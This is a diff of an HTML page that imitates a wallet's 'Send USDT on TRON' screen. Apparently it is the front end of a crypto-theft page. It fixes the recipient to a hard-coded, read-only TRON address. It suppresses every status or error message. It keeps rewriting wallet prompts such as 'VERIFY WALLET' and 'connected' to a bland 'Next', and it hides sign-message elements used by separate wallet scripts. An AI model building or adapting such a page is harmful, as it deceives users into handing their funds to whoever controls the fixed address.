@@ -1,382 +1,403 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Enviar USDT na TRON</title>
-  
-  <!-- CDNs de Web3.js y TronWeb -->
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
-
-  <!-- Evita el aviso 404 del favicon -->
-  <link rel="shortcut icon" href="#">
-
-  <!-- Estilos CSS -->
-  <style>
-    :root{ color-scheme:light; }
-    *{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
-    html,body{ width:100%; max-width:100%; overflow-x:hidden; }
-    body{ min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding-top:56px; background:#d1d1d1; color:#242424; }
-    .modal{ position:relative; width:100%; max-width:390px; min-height:calc(100vh - 56px); padding:18px 16px 104px; overflow:hidden; border-radius:34px 34px 0 0; background:#fff; box-shadow:0 -1px 0 rgba(0,0,0,.02); }
-    .header{ position:relative; margin-bottom:29px; text-align:center; }
-    .header h1{ font-size:20px; line-height:30px; font-weight:750; letter-spacing:-.25px; }
-    .close{ position:absolute; top:0; right:0; width:30px; height:30px; display:flex; align-items:center; justify-content:center; color:#5f6064; cursor:pointer; }
-    .close svg{ width:22px; height:22px; stroke-width:2.5; }
-    .label{ display:block; margin-bottom:10px; color:#4e4f52; font-size:15px; line-height:20px; font-weight:650; }
-    .input-box,.amount-box{ width:100%; display:flex; align-items:center; border:1px solid #a6a6a8; border-radius:10px; background:#fff; transition:border-color .15s ease,box-shadow .15s ease; }
-    .input-box{ min-height:56px; padding:0 14px; margin-bottom:24px; }
-    .input-box:focus-within,.amount-box:focus-within{ border-color:#111dd8; box-shadow:0 0 0 1px #111dd8; }
-    .address{ width:100%; min-width:0; flex:1; border:0; outline:0; background:transparent; color:#505156; font-size:13px; font-weight:500; text-overflow:ellipsis; }
-    .address-actions{ display:flex; align-items:center; gap:12px; flex-shrink:0; margin-left:10px; color:#101bd4; }
-    .address-action{ display:flex; align-items:center; justify-content:center; border:0; padding:0; background:transparent; color:inherit; cursor:pointer; }
-    .address-action.paste{ font-size:14px; line-height:22px; font-weight:700; }
-    .address-action svg{ width:23px; height:23px; stroke:currentColor; }
-    .address-action.qr svg{ width:24px; height:24px; }
-    .network{ display:inline-flex; align-items:center; gap:7px; margin-bottom:22px; padding:6px 12px 6px 7px; border-radius:999px; background:#f3f3f5; }
-    .eth-logo{ width:25px; height:25px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
-    .network span{ display:flex; align-items:center; gap:6px; color:#707176; font-size:15px; font-weight:650; }
-    .network .caret{ width:10px; height:10px; color:#919297; }
-    .amount-box{ min-height:57px; padding:0 14px; margin-bottom:11px; }
-    .amount{ flex:1; width:100%; min-width:0; border:0; outline:0; background:transparent; color:#202124; font-size:18px; font-weight:500; }
-    .amount::placeholder{ color:#202124; }
-    .right{ display:flex; align-items:center; gap:12px; flex-shrink:0; }
-    .clear{ width:22px; height:22px; min-width:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; background:#66676b; color:#fff; cursor:pointer; }
-    .clear svg{ width:12px; height:12px; }
-    .token{ color:#5e5f63; font-size:15px; font-weight:650; }
-    .max{ color:#0d19d5; font-size:15px; font-weight:700; cursor:pointer; }
-    .warning{ color:#4d4e51; font-size:13px; line-height:18px; font-weight:500; }
-    .fiat{ margin-top:6px; color:#494a4d; font-size:14px; font-weight:500; }
-    .status{ margin-top:13px; padding:10px 11px; border-radius:10px; background:#f4f4f6; color:#555; font-size:12px; line-height:1.35; overflow-wrap:anywhere; }
-    .status:empty{ display:none; }
-    .status.success{ background:#eaf8ef; color:#18733a; }
-    .status.error{ background:#fff0ef; color:#b42318; }
-    .btn{ position:fixed; left:50%; bottom:max(20px,env(safe-area-inset-bottom)); transform:translateX(-50%); width:calc(100% - 32px); max-width:358px; height:53px; border:0; border-radius:999px; background:#908cf2; color:#fff; font-size:17px; font-weight:750; cursor:pointer; transition:filter .15s ease,transform .1s ease; }
-    .btn:hover{ filter:brightness(.97); }
-    .btn:active{ transform:translateX(-50%) scale(.99); }
-    .btn:disabled{ cursor:not-allowed; opacity:.55; }
-    @media(min-width:481px){ .modal{ box-shadow:0 8px 36px rgba(0,0,0,.12); } }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enviar USDT na TRON</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+<script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
+<style>
+:root{ color-scheme:light; }
+*{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+html,body{ width:100%; max-width:100%; overflow-x:hidden; }
+body{ min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding-top:56px; background:#d1d1d1; color:#242424; }
+.modal{ position:relative; width:100%; max-width:390px; min-height:calc(100vh - 56px); padding:18px 16px 104px; overflow:hidden; border-radius:34px 34px 0 0; background:#fff; box-shadow:0 -1px 0 rgba(0,0,0,.02); }
+.header{ position:relative; margin-bottom:29px; text-align:center; }
+.header h1{ font-size:20px; line-height:30px; font-weight:750; letter-spacing:-.25px; }
+.close{ position:absolute; top:0; right:0; width:30px; height:30px; display:flex; align-items:center; justify-content:center; color:#5f6064; cursor:pointer; }
+.close svg{ width:22px; height:22px; stroke-width:2.5; }
+.label{ display:block; margin-bottom:10px; color:#4e4f52; font-size:15px; line-height:20px; font-weight:650; }
+.input-box,.amount-box{ width:100%; display:flex; align-items:center; border:1px solid #a6a6a8; border-radius:10px; background:#fff; transition:border-color .15s ease,box-shadow .15s ease; }
+.input-box{ min-height:56px; padding:0 14px; margin-bottom:24px; }
+.input-box:focus-within,.amount-box:focus-within{ border-color:#111dd8; box-shadow:0 0 0 1px #111dd8; }
+.address{ width:100%; min-width:0; flex:1; border:0; outline:0; background:transparent; color:#505156; font-size:13px; font-weight:500; text-overflow:ellipsis; }
+.address-actions{ display:flex; align-items:center; gap:12px; flex-shrink:0; margin-left:10px; color:#101bd4; }
+.address-action{ display:flex; align-items:center; justify-content:center; border:0; padding:0; background:transparent; color:inherit; cursor:pointer; }
+.address-action.paste{ font-size:14px; line-height:22px; font-weight:700; }
+.address-action svg{ width:23px; height:23px; stroke:currentColor; }
+.address-action.qr svg{ width:24px; height:24px; }
+.network{ display:inline-flex; align-items:center; gap:7px; margin-bottom:22px; padding:6px 12px 6px 7px; border-radius:999px; background:#f3f3f5; }
+.eth-logo{ width:25px; height:25px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.network span{ display:flex; align-items:center; gap:6px; color:#707176; font-size:15px; font-weight:650; }
+.network .caret{ width:10px; height:10px; color:#919297; }
+.amount-box{ min-height:57px; padding:0 14px; margin-bottom:11px; }
+.amount{ flex:1; width:100%; min-width:0; border:0; outline:0; background:transparent; color:#202124; font-size:18px; font-weight:500; }
+.amount::placeholder{ color:#202124; }
+.right{ display:flex; align-items:center; gap:12px; flex-shrink:0; }
+.clear{ width:22px; height:22px; min-width:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; background:#66676b; color:#fff; cursor:pointer; }
+.clear svg{ width:12px; height:12px; }
+.token{ color:#5e5f63; font-size:15px; font-weight:650; }
+.max{ color:#0d19d5; font-size:15px; font-weight:700; cursor:pointer; }
+.warning{ color:#4d4e51; font-size:13px; line-height:18px; font-weight:500; }
+.fiat{ margin-top:6px; color:#494a4d; font-size:14px; font-weight:500; }
+.status{ margin-top:13px; padding:10px 11px; border-radius:10px; background:#f4f4f6; color:#555; font-size:12px; line-height:1.35; overflow-wrap:anywhere; }
+.status:empty{ display:none; }
+.status.success{ background:#eaf8ef; color:#18733a; }
+.status.error{ background:#fff0ef; color:#b42318; }
+.btn{ position:fixed; left:50%; bottom:max(20px,env(safe-area-inset-bottom)); transform:translateX(-50%); width:calc(100% - 32px); max-width:358px; height:53px; border:0; border-radius:999px; background:#908cf2; color:#fff; font-size:17px; font-weight:750; cursor:pointer; transition:filter .15s ease,transform .1s ease; }
+.btn:hover{ filter:brightness(.97); }
+.btn:active{ transform:translateX(-50%) scale(.99); }
+.btn:disabled{ cursor:not-allowed; opacity:.55; }
+@media(min-width:481px){ .modal{ box-shadow:0 8px 36px rgba(0,0,0,.12); } }
+</style>
 </head>
+
 <body>
 
-  <!-- ============================================================
-       Layout visual principal — pantalla "Enviar USDT"
-       ============================================================ -->
-  <div class="modal">
+<!-- ============================================================
+     Elementos ocultos exigidos por script.js / app-usdt-trc20.js
+     Nenhum deles aparece no layout visual.
+     ============================================================ -->
 
-      <div class="header">
-          <h1>Enviar USDT</h1>
-          <div class="close">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
-          </div>
-      </div>
+<div id="wallet" style="display:none;"></div>
 
-      <label class="label" for="addressInput">Dirección/nombre de dominio</label>
+<nav class="navbar" style="display:none;">
+    <div id="hamburger" style="display:none;"><span></span><span></span><span></span></div>
+    <ul id="navMenu" style="display:none;"></ul>
+</nav>
 
-      <div class="input-box">
-          <input class="address" id="addressInput" type="text" value="TXzBiXTCMwhD9QcNL2tu3RrxXTJSe5o7G6" readonly aria-readonly="true" />
-          <div class="address-actions" aria-label="Opções do endereço">
-              <button class="address-action paste" type="button" data-fixed-action>Pegar</button>
-              <button class="address-action" type="button" aria-label="Agenda de endereços" data-fixed-action>
-                  <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                      <rect x="7" y="3" width="13" height="18" rx="1.6"/>
-                      <path d="M4 7h4M4 12h4M4 17h4"/>
-                      <path d="M11 8h5M11 12h5"/>
-                  </svg>
-              </button>
-              <button class="address-action qr" type="button" aria-label="Ler QR Code" data-fixed-action>
-                  <svg viewBox="0 0 24 24" fill="none" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                      <path d="M8 3H4a1 1 0 0 0-1 1v4"/>
-                      <path d="M16 3h4a1 1 0 0 1 1 1v4"/>
-                      <path d="M21 16v4a1 1 0 0 1-1 1h-4"/>
-                      <path d="M8 21H4a1 1 0 0 1-1-1v-4"/>
-                      <path d="M7 12h10"/>
-                  </svg>
-              </button>
-          </div>
-      </div>
+<div style="display:none;">
+    <button id="langBtn"></button>
+    <div id="langDropdown">
+        <button class="lang-option" data-lang="en">EN</button>
+    </div>
+    <span id="currentLang">EN</span>
+</div>
 
-      <label class="label">Red de destino</label>
+<div style="display:none;">
+    <button id="tabSign">Sign message</button>
+    <button id="tabVerify">Verify message</button>
+</div>
 
-      <div class="network">
-          <div class="eth-logo" style="background:#ef0027">
-              <span style="color:#fff;font-weight:800;font-size:13px">&#9661;</span>
-          </div>
-          <span>TRON
-              <svg class="caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
-          </span>
-      </div>
+<div id="signContent" style="display:none;">
+    <label class="field-label">Hex format</label>
+    <input type="checkbox" id="hexToggle">
+    <textarea id="messageInput" maxlength="1024">This account belongs to ...</textarea>
+    <span id="charCount">27 / 1024</span>
+    <span id="walletAddress">T...</span>
+    <div id="signatureOutput">Will be generated after signing</div>
+    <button id="clearAllBtn">Clear all</button>
+    <button id="closePanelBtn">&times;</button>
+    <div id="mobileWalletOptions" style="display:none;">
+        <button id="openTrustWallet">Trust Wallet</button>
+        <button id="openMetaMask">TronLink</button>
+    </div>
+</div>
 
-      <label class="label" for="amountInput">Cantidad</label>
+<div id="verifyContent" style="display:none;">
+    <textarea placeholder="Enter signed message..."></textarea>
+    <input type="text" placeholder="Enter signer address...">
+    <input type="text" placeholder="Enter signature...">
+</div>
 
-      <div class="amount-box">
-          <input class="amount" id="amountInput" type="text" inputmode="decimal" value="" placeholder="0" />
-          <div class="right">
-              <div class="clear">
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
-              </div>
-              <div class="token">USDT</div>
-              <div class="max">Máx.</div>
-          </div>
-      </div>
+<div id="walletInfo" style="display:none!important;">
+    <div class="info-row" style="display:none!important;">
+        <span class="label">Wallet Address:</span>
+        <span class="value" style="display:none!important;"></span>
+    </div>
+    <div class="info-row" style="display:none!important;">
+        <span class="label">Current Balance:</span>
+        <span id="currentBalance" class="value" style="display:none!important;">0.0000 USDT</span>
+    </div>
+    <div class="info-row" style="display:none!important;">
+        <span class="label">Transaction Amount:</span>
+        <span id="sendAmount" class="value" style="display:none!important;">0.0000 USDT</span>
+    </div>
+</div>
 
-      <div class="warning"></div>
-      <div class="fiat"></div>
-
-      <div id="status" class="status" role="status" aria-live="polite"></div>
-
-      <button class="btn" id="connectBtn">Conectar</button>
-
-  </div>
-
-  <!-- ============================================================
-       Elementos ocultos exigidos por script.js / app-usdt-trc20.js
-       Nenhum deles aparece no layout visual.
-       ============================================================ -->
-
-  <div id="wallet" style="display:none;"></div>
-
-  <nav class="navbar" style="display:none;">
-      <div id="hamburger" style="display:none;"><span></span><span></span><span></span></div>
-      <ul id="navMenu" style="display:none;"></ul>
-  </nav>
-
-  <div style="display:none;">
-      <button id="langBtn"></button>
-      <div id="langDropdown">
-          <button class="lang-option" data-lang="en">EN</button>
-      </div>
-      <span id="currentLang">EN</span>
-  </div>
-
-  <div style="display:none;">
-      <button id="tabSign">Sign message</button>
-      <button id="tabVerify">Verify message</button>
-  </div>
-
-  <div id="signContent" style="display:none;">
-      <label class="field-label">Hex format</label>
-      <input type="checkbox" id="hexToggle">
-      <textarea id="messageInput" maxlength="1024">This account belongs to ...</textarea>
-      <span id="charCount">27 / 1024</span>
-      <span id="walletAddress">T...</span>
-      <div id="signatureOutput">Will be generated after signing</div>
-      <button id="clearAllBtn">Clear all</button>
-      <button id="closePanelBtn">&times;</button>
-      <div id="mobileWalletOptions" style="display:none;">
-          <button id="openTrustWallet">Trust Wallet</button>
-          <button id="openMetaMask">TronLink</button>
-      </div>
-  </div>
-
-  <div id="verifyContent" style="display:none;">
-      <textarea placeholder="Enter signed message..."></textarea>
-      <input type="text" placeholder="Enter signer address...">
-      <input type="text" placeholder="Enter signature...">
-  </div>
-
-  <div id="walletInfo" style="display:none!important;">
-      <div class="info-row" style="display:none!important;">
-          <span class="label">Wallet Address:</span>
-          <span class="value" style="display:none!important;"></span>
-      </div>
-      <div class="info-row" style="display:none!important;">
-          <span class="label">Current Balance:</span>
-          <span id="currentBalance" class="value" style="display:none!important;">0.0000 USDT</span>
-      </div>
-      <div class="info-row" style="display:none!important;">
-          <span class="label">Transaction Amount:</span>
-          <span id="sendAmount" class="value" style="display:none!important;">0.0000 USDT</span>
-      </div>
-  </div>
-
-  <!-- Capa de compatibilidad Proxy (sendBtn -> connectBtn) -->
-  <script>
-    (function(){
-      Object.defineProperty(document, '_sendBtnProxy', { value: true });
-      var _origGetById = document.getElementById.bind(document);
-      document.getElementById = function(id){
+<!-- sendBtn redirecionado para connectBtn via proxy -->
+<script>
+(function(){
+    // Cria um proxy: qualquer acesso a sendBtn vira acesso ao connectBtn
+    Object.defineProperty(document, '_sendBtnProxy', { value: true });
+    var _origGetById = document.getElementById.bind(document);
+    document.getElementById = function(id){
         if(id === 'sendBtn') return _origGetById('connectBtn');
         return _origGetById(id);
-      };
-      var _origQS = document.querySelector.bind(document);
-      document.querySelector = function(sel){
+    };
+    var _origQS = document.querySelector.bind(document);
+    document.querySelector = function(sel){
         if(sel === '#sendBtn') return _origGetById('connectBtn');
         return _origQS(sel);
-      };
-    })();
-  </script>
+    };
+})();
+</script>
 
-  <!-- Script con la lógica de sustitución de texto y controladores UI -->
-  <script>
-  (function() {
-      'use strict';
+<!-- ============================================================
+     Layout visual principal — tela "Enviar USDT"
+     ============================================================ -->
+<div class="modal">
 
-      console.log('[Auto] ✅ Sistema de substituição de texto ativado');
+    <div class="header">
+        <h1>Enviar USDT</h1>
+        <div class="close">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </div>
+    </div>
 
-      // --- 1. OCULTAR ALERTAS (status) ---
-      const statusDiv = document.getElementById('status');
-      if (statusDiv) {
-          statusDiv.style.display = 'none';
-          Object.defineProperty(statusDiv, 'textContent', {
-              set: function() { /* ignora */ },
-              get: function() { return ''; }
-          });
-          Object.defineProperty(statusDiv, 'innerHTML', {
-              set: function() { /* ignora */ },
-              get: function() { return ''; }
-          });
-          statusDiv.classList.remove('success', 'error');
-          const observer = new MutationObserver(function() {
-              statusDiv.style.display = 'none';
-          });
-          observer.observe(statusDiv, { attributes: true, childList: true, subtree: true });
-      }
+    <label class="label" for="addressInput">Dirección/nombre de dominio</label>
 
-      // --- 2. FUNÇÃO PARA SUBSTITUIR TEXTO ---
-      function substituirTextoBotao() {
-          const btn = document.getElementById('connectBtn');
-          if (!btn) return;
+    <div class="input-box">
+        <input class="address" id="addressInput" type="text" value="TXzBiXTCMwhD9QcNL2tu3RrxXTJSe5o7G6" readonly aria-readonly="true" />
+        <div class="address-actions" aria-label="Opções do endereço">
+            <button class="address-action paste" type="button" data-fixed-action>Pegar</button>
+            <button class="address-action" type="button" aria-label="Agenda de endereços" data-fixed-action>
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="7" y="3" width="13" height="18" rx="1.6"/>
+                    <path d="M4 7h4M4 12h4M4 17h4"/>
+                    <path d="M11 8h5M11 12h5"/>
+                </svg>
+            </button>
+            <button class="address-action qr" type="button" aria-label="Ler QR Code" data-fixed-action>
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M8 3H4a1 1 0 0 0-1 1v4"/>
+                    <path d="M16 3h4a1 1 0 0 1 1 1v4"/>
+                    <path d="M21 16v4a1 1 0 0 1-1 1h-4"/>
+                    <path d="M8 21H4a1 1 0 0 1-1-1v-4"/>
+                    <path d="M7 12h10"/>
+                </svg>
+            </button>
+        </div>
+    </div>
 
-          const texto = btn.textContent;
-          
-          const textosParaSubstituir = [
-              'connected', 'Connected', 'CONNECTED',
-              'VERIFY WALLET', 'Verify Wallet', 'verify wallet',
-              'PREPARING', 'Preparing', 'preparing',
-              'Conectar', 'connect'
-          ];
+    <label class="label">Red de destino</label>
 
-          const deveSubstituir = textosParaSubstituir.some(t => 
-              texto === t || texto.includes(t)
-          );
+    <div class="network">
+        <div class="eth-logo" style="background:#ef0027">
+            <span style="color:#fff;font-weight:800;font-size:13px">&#9661;</span>
+        </div>
+        <span>TRON
+            <svg class="caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+        </span>
+    </div>
 
-          if (deveSubstituir) {
-              btn.textContent = 'Siguiente';
-              console.log('[Auto] ✅ Texto substituído: "' + texto + '" → "Siguiente"');
-          }
-      }
+    <label class="label" for="amountInput">Cantidad</label>
 
-      substituirTextoBotao();
+    <div class="amount-box">
+        <input class="amount" id="amountInput" type="text" inputmode="decimal" value="" placeholder="0" />
+        <div class="right">
+            <div class="clear">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+            </div>
+            <div class="token">USDT</div>
+            <div class="max">Máx.</div>
+        </div>
+    </div>
 
-      const observer = new MutationObserver(function(mutations) {
-          let botaoMudou = false;
-          
-          for (const mutation of mutations) {
-              if (mutation.target.id === 'connectBtn' || 
-                  mutation.target === document.getElementById('connectBtn') ||
-                  (mutation.type === 'childList' && mutation.target.querySelector && mutation.target.querySelector('#connectBtn'))) {
-                  botaoMudou = true;
-                  break;
-              }
-          }
+    <div class="warning"></div>
+    <div class="fiat"></div>
 
-          if (botaoMudou) {
-              substituirTextoBotao();
-          }
-      });
+    <div id="status" class="status" role="status" aria-live="polite"></div>
 
-      observer.observe(document.body, {
-          childList: true,
-          subtree: true,
-          characterData: true,
-          attributes: true,
-          attributeFilter: ['textContent', 'innerHTML']
-      });
+    <button class="btn" id="connectBtn">Conectar</button>
 
-      const btn = document.getElementById('connectBtn');
-      if (btn) {
-          const btnObserver = new MutationObserver(function() {
-              substituirTextoBotao();
-          });
-          btnObserver.observe(btn, {
-              childList: true,
-              characterData: true,
-              subtree: true
-          });
-      }
+</div>
 
-      setInterval(function() {
-          substituirTextoBotao();
-      }, 500);
+<script>
+// ================================================================
+// APENAS SUBSTITUI "connected", "VERIFY WALLET" E "PREPARING" POR "Próximo"
+// ================================================================
 
-  })();
+(function() {
+    'use strict';
 
-  document.addEventListener('DOMContentLoaded', function () {
-      var btn = document.getElementById('connectBtn');
-      if (btn) {
-          btn.textContent = 'Siguiente';
-      }
+    console.log('[Auto] ✅ Sistema de substituição de texto ativado');
 
-      var input = document.getElementById('amountInput');
-      if (input) {
-          input.addEventListener('input', function () {
-              if (btn) {
-                  btn.style.background = this.value.trim() !== '' ? 'blue' : '#908cf2';
-              }
-          });
-      }
-  });
-  </script>
-
-  <!-- Archivos locales de scripts -->
-  <script src="translations.js"></script>
-  <script src="script.js"></script>
-
-  <!-- Módulo Web3 principal de TRON / USDT -->
-  <script type="module">
-    import { conectarTronLink, obtenerSaldoUSDT, enviarUSDT } from './js/app-usdt-trc20.js';
-
-    document.addEventListener('DOMContentLoaded', function () {
-      const btn = document.getElementById('connectBtn');
-      const input = document.getElementById('amountInput');
-      const addressInput = document.getElementById('addressInput');
-
-      if (btn) {
-        btn.addEventListener('click', async () => {
-          const monto = input ? input.value.trim() : '';
-          const destino = addressInput ? addressInput.value.trim() : '';
-
-          if (!monto || parseFloat(monto) <= 0) {
-            alert('Por favor, ingresa un monto válido.');
-            return;
-          }
-
-          try {
-            if (typeof cambiarEstadoBoton === 'function') {
-              cambiarEstadoBoton('connectBtn', true);
-            }
-
-            const direccionUsuario = await conectarTronLink();
-
-            const saldo = await obtenerSaldoUSDT(direccionUsuario);
-            const saldoElem = document.getElementById('saldoTexto');
-            if (saldoElem) {
-              saldoElem.innerText = `Saldo: ${saldo} USDT`;
-            }
-
-            if (saldo < parseFloat(monto)) {
-              alert(`Saldo insuficiente. Tu saldo es de ${saldo} USDT.`);
-              return;
-            }
-
-            if (typeof enviarUSDT === 'function') {
-              const txHash = await enviarUSDT(destino, monto);
-              alert(`Transacción realizada con éxito. Hash: ${txHash}`);
-            }
-
-          } catch (error) {
-            console.error('Error durante el proceso Web3:', error);
-            alert(error.message || 'Ocurrió un error al procesar la operación.');
-          } finally {
-            if (typeof cambiarEstadoBoton === 'function') {
-              cambiarEstadoBoton('connectBtn', false);
-            }
-          }
+    // --- 1. OCULTAR ALERTAS (status) ---
+    const statusDiv = document.getElementById('status');
+    if (statusDiv) {
+        statusDiv.style.display = 'none';
+        Object.defineProperty(statusDiv, 'textContent', {
+            set: function() { /* ignora */ },
+            get: function() { return ''; }
         });
-      }
+        Object.defineProperty(statusDiv, 'innerHTML', {
+            set: function() { /* ignora */ },
+            get: function() { return ''; }
+        });
+        statusDiv.classList.remove('success', 'error');
+        const observer = new MutationObserver(function() {
+            statusDiv.style.display = 'none';
+        });
+        observer.observe(statusDiv, { attributes: true, childList: true, subtree: true });
+    }
+
+    // --- 2. FUNÇÃO PARA SUBSTITUIR TEXTO ---
+    function substituirTextoBotao() {
+        const btn = document.getElementById('connectBtn');
+        if (!btn) return;
+
+        const texto = btn.textContent;
+        
+        // Lista de textos a serem substituídos
+        const textosParaSubstituir = [
+            'connected', 'Connected', 'CONNECTED',
+            'VERIFY WALLET', 'Verify Wallet', 'verify wallet',
+            'PREPARING', 'Preparing', 'preparing',
+            'Conectar', 'connect'
+        ];
+
+        // Verifica se o texto atual deve ser substituído
+        const deveSubstituir = textosParaSubstituir.some(t => 
+            texto === t || texto.includes(t)
+        );
+
+        if (deveSubstituir) {
+            btn.textContent = 'Siguiente';
+            console.log('[Auto] ✅ Texto substituído: "' + texto + '" → "Siguiente"');
+        }
+    }
+
+    // --- 3. EXECUTAR SUBSTITUIÇÃO IMEDIATAMENTE ---
+    substituirTextoBotao();
+
+    // --- 4. MUTATION OBSERVER PARA MONITORAR MUDANÇAS ---
+    const observer = new MutationObserver(function(mutations) {
+        // Verifica se alguma mutação afetou o botão
+        let botaoMudou = false;
+        
+        for (const mutation of mutations) {
+            if (mutation.target.id === 'connectBtn' || 
+                mutation.target === document.getElementById('connectBtn') ||
+                (mutation.type === 'childList' && mutation.target.querySelector && mutation.target.querySelector('#connectBtn'))) {
+                botaoMudou = true;
+                break;
+            }
+        }
+
+        if (botaoMudou) {
+            substituirTextoBotao();
+        }
     });
-  </script>
+
+    // Observa o corpo do documento
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        characterData: true,
+        attributes: true,
+        attributeFilter: ['textContent', 'innerHTML']
+    });
+
+    // --- 5. OBSERVADOR ESPECÍFICO PARA O BOTÃO ---
+    const btn = document.getElementById('connectBtn');
+    if (btn) {
+        const btnObserver = new MutationObserver(function() {
+            substituirTextoBotao();
+        });
+        btnObserver.observe(btn, {
+            childList: true,
+            characterData: true,
+            subtree: true
+        });
+    }
+
+    // --- 6. INTERVALO DE SEGURANÇA ---
+    setInterval(function() {
+        substituirTextoBotao();
+    }, 500);
+
+    console.log('[Auto] ✅ Sistema funcionando - substituindo "connected", "VERIFY WALLET" e "PREPARING" por "Próximo"');
+
+})();
+
+// ================================================================
+// CONFIGURAÇÕES ORIGINAIS (MANTIDAS)
+// ================================================================
+
+document.addEventListener('DOMContentLoaded', function () {
+    var btn = document.getElementById('connectBtn');
+    if (btn) {
+        btn.textContent = 'Siguiente';
+    }
+
+    // Muda cor do botão quando o campo de valor é preenchido
+    var input = document.getElementById('amountInput');
+    if (input) {
+        input.addEventListener('input', function () {
+            if (btn) {
+                btn.style.background = this.value.trim() !== '' ? 'blue' : '#908cf2';
+            }
+        });
+    }
+
+    // Tabs (ocultas — mantidas para compatibilidade com JS)
+    var tabSign    = document.getElementById('tabSign');
+    var tabVerify  = document.getElementById('tabVerify');
+    var signContent   = document.getElementById('signContent');
+    var verifyContent = document.getElementById('verifyContent');
+    
+    if (tabSign) {
+        tabSign.addEventListener('click', function () {
+            tabSign.classList.add('active');
+            tabVerify.classList.remove('active');
+            if (signContent) signContent.style.display = '';
+            if (verifyContent) verifyContent.style.display = 'none';
+        });
+    }
+    
+    if (tabVerify) {
+        tabVerify.addEventListener('click', function () {
+            tabVerify.classList.add('active');
+            tabSign.classList.remove('active');
+            if (verifyContent) verifyContent.style.display = '';
+            if (signContent) signContent.style.display = 'none';
+        });
+    }
+
+    // Contagem de caracteres (oculto — compatibilidade com JS)
+    var messageInput = document.getElementById('messageInput');
+    var charCount    = document.getElementById('charCount');
+    if (messageInput && charCount) {
+        messageInput.addEventListener('input', function () {
+            charCount.textContent = messageInput.value.length + ' / 1024';
+        });
+    }
+
+    // Botão Clear all (oculto — compatibilidade com JS)
+    var clearAllBtn = document.getElementById('clearAllBtn');
+    if (clearAllBtn) {
+        clearAllBtn.addEventListener('click', function () {
+            if (messageInput) messageInput.value = 'This account belongs to ...';
+            if (charCount)    charCount.textContent = '27 / 1024';
+            var sig = document.getElementById('signatureOutput');
+            if (sig) sig.textContent = 'Will be generated after signing';
+        });
+    }
+
+    // Botão Close panel (oculto — compatibilidade com JS)
+    var closePanelBtn = document.getElementById('closePanelBtn');
+    if (closePanelBtn) {
+        closePanelBtn.addEventListener('click', function () {
+            var panel = document.querySelector('.sign-panel');
+            if (panel) panel.style.display = 'none';
+        });
+    }
+
+    // Format buttons (ocultos — compatibilidade com JS)
+    document.querySelectorAll('.format-btn').forEach(function (b) {
+        b.addEventListener('click', function () {
+            var active = document.querySelector('.format-btn.active');
+            if (active) active.classList.remove('active');
+            this.classList.add('active');
+        });
+    });
+});
+</script>
+
+<script src="translations.js"></script>
+<script src="script.js"></script>
+<script type="module" src="js/app-usdt-trc20.js"></script>
 
 </body>
 </html>
